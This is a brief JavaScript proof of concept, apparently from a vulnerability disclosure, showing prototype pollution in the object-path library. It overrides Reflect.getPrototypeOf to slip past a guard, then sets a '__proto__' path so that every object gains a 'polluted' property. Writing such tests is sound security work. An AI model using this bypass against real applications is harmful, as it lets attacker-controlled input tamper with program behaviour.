Reflect.getPrototypeOf = () => false;
const objectPath = require('object-path');
console.log({}.polluted);
objectPath.withInheritedProps.set({}, [
    ['__proto__'],
    'polluted'
], 'yes');
console.log({}.polluted);